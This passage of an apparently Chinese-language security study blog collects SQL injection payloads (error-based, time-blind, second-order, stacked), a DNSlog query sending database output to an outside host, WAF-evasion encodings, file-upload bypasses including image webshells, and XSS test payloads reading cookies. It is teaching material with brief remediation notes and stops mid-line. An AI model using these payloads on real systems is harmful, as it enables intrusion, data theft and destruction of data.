<p><code>bigint</code>超出范围，<code>~0</code>是对0逐位取反</p>
<p>4.<code>extractvalue(1,concat(0x7e,(select @@version),0x7e)</code></p>
<p><code>mysql</code>对<code>xml</code>数据进行查询和修改的<code>xpath</code>函数，<code>xpath</code>语法错误</p>
<p>5.<code>updatexml(1,concat(0x7e,(select @@verison),0x7e),1)</code></p>
<p><code>mysql</code>对<code>xml</code>数据进行查询和修改的<code>xpath</code>函数，<code>xpath</code>语法错误</p>
<p>6.<code>union select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</code></p>
<p><code>mysql</code>的重复特性，重复<code>version</code>，报错</p>
<h4 id="基于时间的sql的盲注——延时注入"><a href="#基于时间的sql的盲注——延时注入" class="headerlink" title="基于时间的sql的盲注——延时注入"></a><strong>基于时间的sql的盲注——延时注入</strong></h4><p>1.<code>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</code></p>
<p><code>if</code>判断语句，当为假时，执行<code>sleep</code></p>
<h3 id="SQL注入中的二次，加解密，DNS等注入"><a href="#SQL注入中的二次，加解密，DNS等注入" class="headerlink" title="SQL注入中的二次，加解密，DNS等注入"></a>SQL注入中的二次，加解密，DNS等注入</h3><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>二次排序注入思路：</p>
<p>​	1.通过构造数据的形式，在提交HTTP数据报文请求到服务端进行处理中，提交的数据报文请求红可能包含了所构造的sql语句或者命令。</p>
<p>​	2.服务端的应用程序会将所提交的数据信息进行存储，通常将信息保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端的请求作出响应。</p>
<p>​	3.第二次发送与第一次不相同的第二个数据请求信息</p>
<p>​	4.服务端在收到第二次提交的请求信息后，为了处理此请求，服务端会查询数据库中已经存储的数据信息并处理，会导致在第一次请求中构造的sql语句或者命令在服务端中执行</p>
<p>​	5.服务端返回执行的处理结果数据信息，可以通过返回的结果数据信息判断二次注入漏洞是否利用成功。</p>
<p>在24关中，首先注册一个<code>admin&#39;#</code>的账号，下一步登录此账号后进行修改密码。这样修改的密码将会是<code>admin</code>的密码。</p>
<p>sql的执行语句会变成：</p>
<p><code>UPDATE users SET passwd=&quot;New_Pass&quot; WHERE username =&#39;admin&#39;# &#39; AND password=&#39;</code></p>
<h4 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h4><ul>
<li>DNSlog可以解决无回显的情况，将注入获得的结果反弹到自己的链接上</li>
<li><code>mysql&gt; select * from users where id=1 and if((select load_file(concat(&#39;\\\\&#39;,(select version()),&#39;.***.ceye.io\\abc&#39;))),1,0);Empty set (21.14 sec)</code></li>
</ul>
<h3 id="SQL注入之堆叠注入及WAF绕过注入"><a href="#SQL注入之堆叠注入及WAF绕过注入" class="headerlink" title="SQL注入之堆叠注入及WAF绕过注入"></a>SQL注入之堆叠注入及WAF绕过注入</h3><img src="/img/8.png" srcset="/img/loading.gif" lazyload style="zoom:60%;" />



<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>堆叠注入可以通过“堆叠”两了解到应该是一堆sql语句在一起执行。在现实情况的mysql主要的命令行中，每一条语句的结尾都要加；用来表示语句的结束。以此来构思是够可以多语句一起使用，这就叫做Stacked injection。</p>
<p>原理：</p>
<p>在sql语句中，分号；是用来表示一条sql语句的结束。可以构思在；结束一条sql语句后继续构造下一条sql语句，是否会一起执行？ 通过这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，在这两个注入中存在着什么区别？其中的区别在于union或者union all 执行的语句类型是有限的——用来执行查询语句。而堆叠注入可以执行的人一语句。</p>
<p>例如：</p>
<p>当输入<code>1;delete from products</code></p>
<p>所生成的sql语句为：</p>
<p><code>select * from products where productid=1;delete from products</code></p>
<h4 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h4><ul>
<li><strong>特殊符号：某些符号并不影响sql语句执行，但可以绕过waf检测：</strong><ul>
<li><code>select 1,database/**/(),3--+</code></li>
</ul>
</li>
<li><code>1/**-1 union select 1,2,3#*/或1/**&amp;id=-1%20union%20select%201,2,3%23</code>。<code>*/</code>其中符号中起到注释作用，正常情况下没有执行，安全狗直接不管，但是参数污染导致接受的真</li>
<li>实数据是<code>-1 union select 1,2,3#*/</code>能正常执行sql</li>
<li>通过更改提交方式绕过WAF</li>
</ul>
<blockquote>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mel">用来绕过安全狗waf<br>%23==》url编码==》#<br>%0a==》url编码==》换行<br>%20==》url编码==》空格<br><br>用来分割语句的符号<br><span class="hljs-comment">/*!*/</span><br><br>原理<br>安全狗检测渗透脚本是采用整体验证，例如:unint <span class="hljs-keyword">select</span> 这个整体<br>可以使用以上方法，使用unint<span class="hljs-comment">/*!*/</span><span class="hljs-keyword">select</span>可不触发waf<br></code></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><p><strong>参数污染：如果出现多个相同参数，不同的服务器搭建网站会出现参数接受的差别，从而令原有的参数失效。</strong></p>
<table>
<thead>
<tr>
<th>Web服务器</th>
<th>参数获取函数</th>
<th>获取到的参数</th>
</tr>
</thead>
<tbody><tr>
<td>PHP&#x2F;Apache</td>
<td>$_GET(“par”)</td>
<td>Last</td>
</tr>
<tr>
<td>JSP&#x2F;Tomcat</td>
<td>Request.getParameter(“par”)</td>
<td>First</td>
</tr>
<tr>
<td>Perl(CGI)&#x2F;Apache</td>
<td>Param(“par”)</td>
<td>First</td>
</tr>
<tr>
<td>Python&#x2F;Apache</td>
<td>Getvalue(“par”)</td>
<td>All(List)</td>
</tr>
<tr>
<td>ASP&#x2F;IIS</td>
<td>Request.QueryString(“par”)</td>
<td>All</td>
</tr>
</tbody></table>
</li>
</ul>
<h4 id="SQL注入sqlmap绕过WAF"><a href="#SQL注入sqlmap绕过WAF" class="headerlink" title="SQL注入sqlmap绕过WAF"></a>SQL注入sqlmap绕过WAF</h4><ul>
<li>在攻防实战中，往往需要掌握一些特性，比如服务器、数据库、应用层、WAF层等，以便我们更灵活地去构造Payload，从而可以和各种WAF进行对抗，绕过安全防御措施进行漏洞利用。</li>
</ul>
<p><strong>1.绕过的方法—白名单</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">方式一:IP白奖单<br>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。<br>测试方法:修改http的header来bypass waf<br>x-forwarded-for<br>x-remote-IP<br>x-originating-IP<br>x-remote-addr<br>x-Real-ip<br><br>方式二:静态资源<br>特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制,waf为了检测效率，不去检测这样一些静态文件名后缀的请求。<br>http://10.9.9.201/ sql.php?<span class="hljs-built_in">id</span>=1<br>http://10.9.9.201/sql.php/1.js?<span class="hljs-built_in">id</span>=1<br>备注: Aspx/php只识别到前面的.aspx/.php后面基本不识别<br><br>方式三:url白名单<br>为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势:<br>http://10.9.9.201/sql.php/admin.php?<span class="hljs-built_in">id</span>=1<br>http://10.9.9.201/sql.php?a=/manage/&amp;b=../etc/passwd<br>http://10.9.9.201/../../../ manage/../sql.asp?<span class="hljs-built_in">id</span>=2<br>waf通过/manage/<span class="hljs-string">&quot;进行比较，只要uri中存在/manage/就作为白名单不进行检测，这样我们可以通过/sql.php?a=/manage/&amp;b=../etc/passwd 绕过防御规则。</span><br><span class="hljs-string"></span><br><span class="hljs-string">方式四:爬虫白名单</span><br><span class="hljs-string">部分waf有提供爬虫白名单（各大浏览器的爬虫）的功能，识别爬虫的技术一般有两种:</span><br><span class="hljs-string">1、根据useragent</span><br><span class="hljs-string">2、通过行为来判断</span><br><span class="hljs-string">UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。User Agent switcher (Firefox附加组件)，下载地址:</span><br><span class="hljs-string">https : //addons.mozilla.org/en-us/firefox/addon/user-agent-switcher/</span><br></code></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%23</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>》url编码<span class="hljs-operator">=</span><span class="hljs-operator">=</span>》#<br><span class="hljs-variable">%0</span>a<span class="hljs-operator">=</span><span class="hljs-operator">=</span>》url编码<span class="hljs-operator">=</span><span class="hljs-operator">=</span>》换行<br><span class="hljs-variable">%20</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>》url编码<span class="hljs-operator">=</span><span class="hljs-operator">=</span>》空格<br><br><span class="hljs-variable">%23</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>aunion<span class="hljs-variable">%23</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>Aselect<span class="hljs-variable">%201</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span><br><br><span class="hljs-variable">%20</span>union<span class="hljs-variable">%20</span>/*<span class="hljs-title">!44509select</span>*/<span class="hljs-variable">%201</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span>    /*<span class="hljs-title">!44509select</span>*/：通过插入版本号（<span class="hljs-number">4.45</span>.<span class="hljs-number">09</span>），绕过检测机制<br><span class="hljs-variable">%20</span>/*<span class="hljs-title">!44509union</span>*/<span class="hljs-variable">%23</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%201</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span><br><br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span>/**&amp;id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-variable">%20</span>union<span class="hljs-variable">%20</span><span class="hljs-keyword">select</span><span class="hljs-variable">%201</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-variable">%23</span>*/				特殊符号<br><br><span class="hljs-variable">%20</span>union<span class="hljs-variable">%20</span>all<span class="hljs-variable">%23</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-keyword">select</span><span class="hljs-variable">%201</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-variable">%23</span><br></code></pre></td></tr></table></figure>



<p><strong>2.当注入语句无法成功时，判断WAF通过什么样的检测进行注入拦截</strong></p>
<ul>
<li><p>当使用sqlmap注入工具时发的包中会存在sqlmap的工具头</p>
<ul>
<li>判断WAF日志</li>
<li>判断WAF的防护规则</li>
<li>通过抓包并修改发包内容</li>
</ul>
</li>
<li><p>从以上几点对WAF进行何种的检测进行判断</p>
</li>
<li><p>解决方案</p>
<ul>
<li>采用sqlmap中随机agent头的方法</li>
<li>采用搜索引擎的头：百度、谷歌</li>
<li>通过使用代理池或者延迟注入达到绕过的目的</li>
</ul>
</li>
</ul>
<blockquote>
<p>扩展一：有的WAF检测的是其他字段，可以使用burp抓包进行替换这个字段，来进行绕过。（只是修改一个）</p>
<p>扩展二：将注入语句生成txt文件，放在sqlmap目录下跑。（可以支持跑多个）</p>
</blockquote>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><img src="/img/9.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="文件上传漏洞概述"><a href="#文件上传漏洞概述" class="headerlink" title="文件上传漏洞概述"></a>文件上传漏洞概述</h3><p><strong>什么是文件上传漏洞?</strong></p>
<ul>
<li>指程序对文件的上传未作全面的限制，导致用户可以上传一些超越用户权限的一些文件，可以是木马，shell脚本，病毒等。</li>
</ul>
<p><strong>文件上传漏洞有哪些危害?</strong></p>
<ul>
<li>可以通过文件上传漏洞上传webshell后门。</li>
</ul>
<p><strong>文件上传漏洞如何查找及判断?</strong></p>
<ul>
<li>黑盒：使用扫描工具扫描打开网站。</li>
<li>黑盒：测试会员中心，测试后台。</li>
<li>白盒：直接对源代码进行代码审计。</li>
</ul>
<p><strong>文件上传漏洞有哪些需要注意的地方?</strong></p>
<ul>
<li>拿到漏洞后要对漏洞<strong>类型</strong>进行区分，编辑器、第三方应用、常规等。</li>
<li>区分漏洞类型</li>
</ul>
<p><strong>关于文件上传漏洞在实际应用中的说明?</strong></p>
<ul>
<li>上传后门脚本获取网站权限。</li>
</ul>
<blockquote>
<p>常规文件上传地址的获取说明：上传的文件要执行的话，要按照对应代码执行。</p>
<p>不同格式下的文件类型后门测试</p>
<p>配合解析漏洞下的文件类型后门测试本地文件：上传+解析漏洞&#x3D;高危漏洞。</p>
<p>上传漏洞靶场环境搭建</p>
<p>测试某CMS及CVE编号文件上传漏洞测试：这种第三方插件的漏洞测试和常规漏洞测试是不一样的。</p>
<ul>
<li>文件上传常见验证 : 后缀名、类型、文件头等<ul>
<li>后缀名 : 黑名单、白名单</li>
<li>文件类型 : MIME信息</li>
<li>文件头 : 内容头信息</li>
<li>方法 : 查看源码、抓包修改包信息</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="文件上传之黑白名单绕过"><a href="#文件上传之黑白名单绕过" class="headerlink" title="文件上传之黑白名单绕过"></a>文件上传之黑白名单绕过</h3><p>在对文件上传漏洞中的黑白名单进行绕过时：</p>
<ul>
<li>第一步先对其使用的是黑名单或者是白名单进行判断</li>
<li>当判断是黑名单过滤的时候考虑过滤规则是对后缀名亦或是类型进行过滤<ul>
<li>当是对后缀名进行过滤时判断时候可以通过更改**后缀名(大小写或者增加特殊符号等)**达到既可以运行同时可以绕过的目的</li>
<li>当对类型进行过滤时可以通过抓包对类型进行更改然后在对文件进行上传</li>
</ul>
</li>
<li>当判断是白名单过滤的时候<ul>
<li>可以通过创建图片马之后将图片马上传，在对图片马尽心调用达到绕过的目的</li>
<li>同时也可以通过截断的方式对白名单过滤方式进行绕过</li>
</ul>
</li>
</ul>
<blockquote>
<p>%00截断：可以把这个放在文件名内，绕过检测。</p>
<p>get：会自动解码</p>
<p>post：不会自动解码，故要想以post提交数据%00需要把它进行url编码变成%25%30%30</p>
</blockquote>
<h3 id="文件上传之内容逻辑数组绕过"><a href="#文件上传之内容逻辑数组绕过" class="headerlink" title="文件上传之内容逻辑数组绕过"></a>文件上传之内容逻辑数组绕过</h3><blockquote>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">图片一句话制作方法:copy <span class="hljs-number">1</span><span class="hljs-selector-class">.png</span> /<span class="hljs-selector-tag">b</span> + shell<span class="hljs-selector-class">.php</span> /<span class="hljs-selector-tag">a</span> webshell<span class="hljs-selector-class">.jpg</span><br>文件头检测<br>图像文件信息判断<br>逻辑安全 二次渲染：指的是网站接受目标后会再进行操作，也就是说会对文件进行二次操作。<br>逻辑安全  条件竞争：有的网站会对上传的文件进行上传后再验证（上传过程不进行验证），这样文件会暂时保存到服务器上，可以趁程序未对此文件进行操作（例如改名，移位等），访问文件进行占用，产生条件竞争。<br>目录命名-x.php/.  ：这种命名方法会保存为一个x.php文件<br>脚本函数漏洞-CVE-<span class="hljs-number">2015</span>-<span class="hljs-number">2348</span>：<br>数组接受+目录命名<br></code></pre></td></tr></table></figure>
</blockquote>
<h3 id="文件上传之解析漏洞编辑器安全"><a href="#文件上传之解析漏洞编辑器安全" class="headerlink" title="文件上传之解析漏洞编辑器安全"></a>文件上传之解析漏洞编辑器安全</h3><p><img src="/img/10.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="文件上传思路"><a href="#文件上传思路" class="headerlink" title="文件上传思路"></a>文件上传思路</h3><blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.上传文件和文件执行是两个东西<br><span class="hljs-number">2</span>.漏洞分类&#123;解析漏洞、cms漏洞、其他漏洞【编辑器漏洞、cve漏洞、安全修复】&#125;<br><br>思路：<br>如果有一个网站，要从文件上传的方向开始<br>第一步：先看中间件，看是否存在解析漏洞<span class="hljs-regexp">/CMS/</span>编辑器漏洞<span class="hljs-regexp">/CVE/</span><br>如果有，如何找：<br>		字典扫描：扫描会员中心，文件上传的位置<br>		关键字搜索:(函数，键字，全局变量等)文件上传，<span class="hljs-variable">$_FILES</span>,move_uploaded_file等<br>		应用功能抓包:(任何可能存在上传的应用功能点)前台会员中心，后台新闻添加等可能存在上传的地方没有文件后缀 判断MIME类型知识点<br>找到后，如何利用：<br>		验证/绕过<br></code></pre></td></tr></table></figure>
</blockquote>
<h3 id="文件上传之WAF绕过及安全修复"><a href="#文件上传之WAF绕过及安全修复" class="headerlink" title="文件上传之WAF绕过及安全修复"></a>文件上传之WAF绕过及安全修复</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">\#上传参数名解析:</span><br><br>明确可以修改的参数：<br><span class="hljs-section">Content-Disposition:一般可更改</span><br><span class="hljs-section">name:表单参数值,不能更改</span><br><span class="hljs-section">filename:文件名,可以更改</span><br><span class="hljs-section">Content-Type:文件MIME，视情况更改</span><br><br><br><br><span class="hljs-section">\#常见绕过方法:</span><br>数据溢出-防匹配(xxx...)	:就是在关键点前面写入大量的无用数据来干扰对后面主要数据的检测<br>符号变异-防匹配(&#x27;	<span class="hljs-string">&quot; 	; )：有的检测可能是基于单引号和双引号来获取数据，可以修改单引号或双引号的位置或增加删除单双引号来干扰waf</span><br><span class="hljs-string">数据截断-防匹配(%00;	换行)：</span><br><span class="hljs-string">重复数据-防匹配(参数多次)</span><br><span class="hljs-string"></span><br><span class="hljs-string">\#Payload :</span><br><span class="hljs-string">大量垃圾数据缓冲溢出(Ccontent-Disposition,filename等)</span><br><span class="hljs-string"></span><br><span class="hljs-string">\#单引号、双引号、分号</span><br><span class="hljs-string">filename=x.php</span><br><span class="hljs-string">filename=&quot;</span>x.php<br>filename=&#x27;x.php<br>filename=<span class="hljs-string">&quot;a.jpg;.php&quot;</span><br><br>\<span class="hljs-comment"># %00、换行</span><br>filename=<span class="hljs-string">&quot;a.php%00.jpg&quot;</span><br>filename=<span class="hljs-string">&quot;Content-Disposition : form-data;name=&quot;</span>upload_file<span class="hljs-string">&quot; ; x.php&quot;</span><br>filename=<span class="hljs-string">&quot;x.jpg&quot;</span> ; filename=<span class="hljs-string">&quot;x.jpg&quot;</span> ; . . . ..filename=<span class="hljs-string">&quot;x.php&quot;</span>;<br>filename=<br><span class="hljs-string">&quot;</span><br><span class="hljs-string">x</span><br><span class="hljs-string">.</span><br><span class="hljs-string">p</span><br><span class="hljs-string">h</span><br><span class="hljs-string">p</span><br><span class="hljs-string">&quot;</span><br>;<br><br><br><span class="hljs-comment">#文件上传安全修复方案</span><br><span class="hljs-section">后端验证:采用服务端验证模式后缀检测:</span><br><span class="hljs-section">基于黑名单，白名单过滤MIME检测:</span><br>基于上传自带类型检测<br><span class="hljs-section">内容检测:文件头，完整性检测</span><br><br><span class="hljs-section">自带函数过滤:参考uploadlabs函数</span><br><span class="hljs-section">自定义函数过滤:function check_file()&#123; &#125;</span><br><span class="hljs-section">WAF防护产品:宝塔,云盾,安全公司产品等</span><br></code></pre></td></tr></table></figure>



<h2 id="XSS跨站"><a href="#XSS跨站" class="headerlink" title="XSS跨站"></a>XSS跨站</h2><h3 id="XSS跨站之原理分类及攻击手法"><a href="#XSS跨站之原理分类及攻击手法" class="headerlink" title="XSS跨站之原理分类及攻击手法"></a>XSS跨站之原理分类及攻击手法</h3><p><strong>原理：</strong></p>
<p>XSS 属于被动式的攻击。攻击者先构造一个跨站页面，利用script等各种方式使得用户浏览这个页面时，触发对被攻击站点的http 请求。此时，如果被攻击者如果已经在被攻击站点登录，就会持有该站点cookie。这样该站点会认为被攻击者发起了一个http 请求。而实际上这个请求是在被攻击者不知情的情况下发起的，由此攻击者在一定程度上达到了冒充被攻击者的目的。精心的构造这个攻击请求，可以达到冒充发文，夺取权限等等多个攻击目的。在常见的攻击实例中，这个请求是通过script 来发起的，因此被称为Cross Site Script。攻击Yahoo Mail 的Yamanner 蠕虫是一个著名的XSS 攻击实例。YahooMail 系统有一个漏洞，当用户在web 上察看信件时，有可能执行到信件内的javascript 代码。病毒可以利用这个漏洞使被攻击用户运行病毒的script。同时Yahoo Mail 系统使用了Ajax技术，这样病毒的script可以很容易的向Yahoo Mail 系统发起ajax 请求，从而得到用户的地址簿，并发送病毒给他人。</p>
<p><strong>危害：</strong></p>
<ul>
<li>钓鱼欺骗</li>
<li>网站挂马</li>
<li>身份盗用</li>
<li>盗取网站用户信息</li>
<li>垃圾信息发送</li>
<li>劫持用户Wed行为</li>
<li>XSS蠕虫</li>
</ul>
<p><strong>分类：</strong></p>
<ul>
<li><strong>反射型(非持久型)：</strong>反射型攻击方式就是把可以执行的 js脚本放到URL参数里面。存储型的攻击方式通过评论的这种方式，加载评论的时候把它写入到评论里面，它被后台存储之后，用户再打开的时候就会执行评论里面的脚本。</li>
</ul>
<blockquote>
<p>发包X&#x3D;123 &#x3D;&gt; x.php &#x3D;&gt;回包</p>
<p>有一些后端它是通过URL参数来去获取的，有时候会把脚本放入URL参数里面如：<a target="_blank" rel="noopener" href="http://test.com/xss/example.php?name=%EF%BC%8C%E7%84%B6%E5%90%8E%E9%80%9A%E8%BF%87%E9%82%AE%E4%BB%B6%E6%96%B9%E5%BC%8F%E5%8F%91%E9%80%81%E7%BB%99%E7%94%A8%E6%88%B7%EF%BC%8C%E8%AF%B1%E5%AF%BC%E7%94%A8%E6%88%B7%E5%8E%BB%E7%82%B9%E5%87%BB,%E8%BF%99%E5%B0%B1%E6%98%AF%E9%9D%9E%E5%AD%98%E5%82%A8%E5%BD%A2%E5%BC%8F%E7%9A%84">http://test.com/xss/example.php?name=，然后通过邮件方式发送给用户，诱导用户去点击,这就是非存储形式的</a> XSS</p>
</blockquote>
<ul>
<li><strong>存储型(持久型)：</strong>存储型攻击方式就是把可以执行的脚本写入到数据库中，这样当任何用户在网址进行与数据库交互的行为时都会触发构造的脚本。</li>
</ul>
<blockquote>
<p>发包X&#x3D;123 &#x3D;&gt; x.php &#x3D;&gt;写到数据库&#x3D;&gt; x.php&#x3D;&gt;回显</p>
<p>评论框中输入script 代码, 一段未经转义过的 JS 代码被插入到页面之后，其他用户浏览的时候也会去执行它。如果是黑客它插一段JS代码，把用户cookie的值发送到指定的服务器上，这样他就能拿到用户的cookie值想干嘛就可以干嘛。我们知道HTTP协议它是没有状态，所以很多网站是通过Cookie去识别用户的，一旦黑客获取到你这个cookie就相当于拥有了你的账户就可以随便使用你这个账号了。这是个什么类型的 xss? 这个是把提交的脚本插入到数据库里面，所以这个是存储型的攻击方式。</p>
</blockquote>
<ul>
<li><strong>DOM型：</strong></li>
</ul>
<img src="/img/11.png" srcset="/img/loading.gif" lazyload style="zoom: 33%;" />

<blockquote>
<p>DOM 将 HTML 文档表达为树结构。DOM 定义了访问和操作 HTML 文档的标准方法。</p>
<p>DOM型跨站形成的原因在于输入的语句在静态的浏览器前端进行处理，可以通过构造跨站语句对网站进行DOM型的跨站攻击。</p>
<p> W3C 文档对象模型 （DOM） 是中立于平台和语言的接口，它允许程序和脚本动态地访问和更新文档的内容、结构和样式。</p>
<p>DOM是属于用js代码进行处理（可直接通过查看代码进行判断是否属于DOM型）反射型与存储型是属于后端语言进行数据处理。</p>
</blockquote>
<h3 id="常用XSS跨站测试语句"><a href="#常用XSS跨站测试语句" class="headerlink" title="常用XSS跨站测试语句"></a>常用XSS跨站测试语句</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs javascript">弹窗测试<span class="hljs-variable constant_">XSS</span> <span class="hljs-variable constant_">JS</span>中，<span class="hljs-title function_">alert</span>() 警告弹窗，<span class="hljs-title function_">confirm</span>() 确认弹窗，<span class="hljs-title function_">promt</span>() 输入弹窗<br>&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&lt;/script&gt; #弹出窗口<br>&lt;script src=<span class="hljs-attr">http</span>:<span class="hljs-comment">//xxx.com/xss,js&gt;&lt;/script&gt; #引用外部xss</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span> #弹出cookie<br><br>&lt;img&gt;标签：<br>&lt;img src=<span class="hljs-number">1</span> on er ror=<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;shallow&quot;</span>)&gt;<br>&lt;img src=1 onerror=alert(/shallow/)&gt;<br>&lt;img src=1 onerror=alert(document.cookie)&gt; #弹出cookie<br>&lt;img src=&quot;javascri pt:alert(&quot;XSS&quot;)&quot;)&gt;<br>&lt;img dyn src=&quot;java script:alert(&quot;XSS&quot;)&quot;)&gt;<br>&lt;img low src=&quot;java script:alert(&quot;XSS&quot;)&quot;)&gt;<br><br>&lt;body&gt;标签：可以使用onload属性或其他更模糊的属性在标记内部传递XSS有效内容background<br>&lt;body background=&quot;javascript:alert(&quot;XSS&quot;)&quot;&gt;<br><br>&lt;iframe&gt;标签：该&lt;iframe&gt;标签允许另一个HTML网页嵌入到父页面<br>Iframe可以包含Javascript，但是由于浏览器的内容安全策略(CSP)，Iframe中的Javascript无法访问父页面中的DOM。然而，Iframe仍然是非常有效的接触网络钓鱼攻击的手段。<br>&lt;iframe src=&quot;http://test.com/xss.html&gt;<br><br>&lt;input&gt;标签:在某些浏览器中，如果标记的type属性&lt;input&gt;设置为image，可以进行嵌入脚本的操作<br>&lt;input type=&quot;image&quot; src=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;<br><br>&lt;link&gt;标签：&lt;link&gt;标签经常用来连接外部的样式表可以包含的脚本<br>&lt;link rel=&quot;stylesheet&quot; 